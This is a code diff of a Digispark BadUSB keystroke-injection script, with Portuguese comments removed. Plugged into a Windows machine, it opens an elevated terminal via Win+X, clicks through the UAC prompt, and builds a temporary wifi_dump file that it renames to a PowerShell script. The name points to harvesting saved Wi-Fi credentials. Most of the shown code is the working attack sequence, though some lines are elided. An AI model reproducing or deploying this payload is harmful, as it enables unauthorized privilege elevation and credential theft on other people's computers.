@@ -4,24 +4,20 @@ void setup() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
 
-  // Win + X → A (admin terminal)
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_A);
   DigiKeyboard.delay(2500);
 
-  // Confirma UAC
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1500);
 
-  // Entra no CMD
   DigiKeyboard.print(F("cmd"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
 
-  // Define caminho dos arquivos
   DigiKeyboard.print(F("set TEMP_TXT=%TEMP%\\wifi_dump.txt"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
@@ -67,7 +63,6 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
 
-  // Renomeia .txt → .ps1
   DigiKeyboard.print(F("rename %TEMP_TXT% wifi_dump.ps1"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
@@ -77,7 +72,6 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(6000);
 
-  // Loop eterno
   for (;;) {}
 }
 
